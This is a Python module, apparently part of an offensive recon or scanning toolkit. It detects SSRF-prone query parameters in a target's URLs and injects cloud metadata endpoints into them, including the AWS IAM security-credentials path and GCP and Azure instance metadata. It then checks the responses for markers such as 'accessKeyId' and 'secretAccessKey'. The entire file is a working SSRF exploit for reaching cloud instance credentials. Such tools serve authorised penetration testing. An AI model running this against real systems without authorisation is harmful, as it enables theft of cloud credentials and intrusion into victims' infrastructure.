"""
modules/cloud_metadata.py
-------------------------
Cloud metadata SSRF exploitation (AWS/GCP/Azure).
Given SSRF-suspicious URLs from recon, attempt metadata endpoints.
"""

from typing import List, Dict, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from core.logger import get_logger, info, ok, warn
from core.utils import safe_request, write_lines, load_json
from modules._common import load_urls, module_dir, save_finding, cli_main

log = get_logger("cloud_metadata")


# URL-fetching parameter hints
SSRF_PARAMS = ["url", "uri", "target", "dest", "destination", "redirect",
               "return", "next", "continue", "callback", "webhook",
               "image", "img", "src", "source", "file", "path",
               "proxy", "fetch", "load", "resource", "host", "domain"]


METADATA_ENDPOINTS = {
    "aws_imds_v1": "http://169.254.169.254/latest/meta-data/",
    "aws_imds_v1_iam": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "aws_imds_v1_userdata": "http://169.254.169.254/latest/user-data/",
    "gcp_metadata": "http://metadata.google.internal/computeMetadata/v1/",
    "azure_metadata": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "digitalocean": "http://169.254.169.254/metadata/v1/",
    "alibaba": "http://100.100.100.200/latest/meta-data/",
}


def find_ssrf_candidates(urls: List[str]) -> List[Dict]:
    """URLs with SSRF-suspect params."""
    out = []
    for u in urls:
        p = urlparse(u)
        qs = parse_qs(p.query)
        for param in qs:
            if param.lower() in SSRF_PARAMS:
                out.append({"url": u, "param": param,
                            "current_value": qs[param][0] if qs[param] else ""})
                break
    return out


def inject_and_check(url: str, param: str, metadata_url: str) -> Optional[Dict]:
    """Inject metadata URL into param; look for metadata strings in response."""
    p = urlparse(url)
    qs = parse_qs(p.query)
    qs[param] = [metadata_url]
    new_url = urlunparse((p.scheme, p.netloc, p.path, p.params,
                          urlencode(qs, doseq=True), ""))
    r = safe_request(new_url, timeout=10)
    if not r:
        return None

    text = (r.text or "")[:20000]
    markers = {
        "aws": ["ami-id", "instance-id", "iam/security-credentials", "accessKeyId", "secretAccessKey"],
        "gcp": ["computeMetadata", "project/project-id", "service-accounts"],
        "azure": ["vmId", "subscriptionId", "resourceGroupName"],
        "common": ["169.254.169.254"],
    }
    for provider, keys in markers.items():
        for k in keys:
            if k in text:
                return {
                    "type": "ssrf_cloud_metadata",
                    "url": new_url,
                    "param": param,
                    "provider": provider,
                    "evidence": f"Metadata marker '{k}' in response",
                    "severity": "critical",
                    "confidence": 85,
                }
    return None


# ─────────────────────────────────────────
# Main
# ─────────────────────────────────────────
def run(domain: str, output_root: str = "results",
        scan_id: Optional[int] = None) -> Dict:
    mdir = module_dir(domain, "cloud_metadata", output_root)
    urls = load_urls(domain, output_root)
    candidates = find_ssrf_candidates(urls)
    if not candidates:
        info("No SSRF-suspect parameters found")
        return {"count": 0, "findings": []}

    info(f"Testing {len(candidates)} SSRF candidates for cloud metadata")
    findings: List[Dict] = []

    for cand in candidates[:100]:
        for name, endpoint in METADATA_ENDPOINTS.items():
            try:
                res = inject_and_check(cand["url"], cand["param"], endpoint)
                if res:
                    findings.append(res)
                    save_finding(
                        domain, "cloud_metadata", "ssrf_cloud_metadata",
                        "critical", res["url"], param=res["param"],
                        evidence=res["evidence"], confidence=res["confidence"],
                        scan_id=scan_id, output_root=output_root,
                    )
                    break  # one provider hit per URL is enough
            except Exception as e:
                log.debug(f"metadata probe failed: {e}")

    if findings:
        write_lines(mdir / "cloud_metadata_findings.txt",
                    [f"[CRITICAL] {f['provider']} {f['url']}" for f in findings])
        warn(f"FOUND {len(findings)} cloud metadata exposures!")

    return {"count": len(findings), "findings": findings}


if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument("-t", "--target", required=True)
    p.add_argument("-o", "--output", default="results")
    args = p.parse_args()
    cli_main(args.target, "cloud_metadata", run, args.output)